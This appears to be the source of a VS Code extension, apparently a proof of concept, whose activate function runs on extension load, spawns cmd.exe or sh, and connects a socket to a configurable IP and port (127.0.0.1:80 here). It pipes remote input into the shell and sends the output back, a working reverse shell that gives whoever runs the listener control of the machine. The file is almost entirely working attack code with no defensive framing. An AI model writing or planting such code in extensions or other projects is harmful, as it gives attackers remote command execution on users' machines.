import * as vscode from 'vscode';
const { exec } = require("child_process");
const net = require("net");
const os = require("os");

export function activate() {
	vscode.window.showInformationMessage('reverse-shell extension activated!');

	let IP = "127.0.0.1";
	let PORT = 80;

	let shellCommand;
	switch (os.platform()) {
		case 'win32':
			shellCommand = "cmd.exe";
			break;
		case 'darwin':
		case 'linux':
			shellCommand = "sh";
			break;
		default:
			return;
	}
	let shell = exec(shellCommand)

	var client_sock = new net.Socket();
	client_sock.connect(PORT, IP, () => {
		client_sock.pipe(shell.stdin);
		shell.stdout.pipe(client_sock);
		shell.stderr.pipe(client_sock);
	});
}

export function deactivate() {}
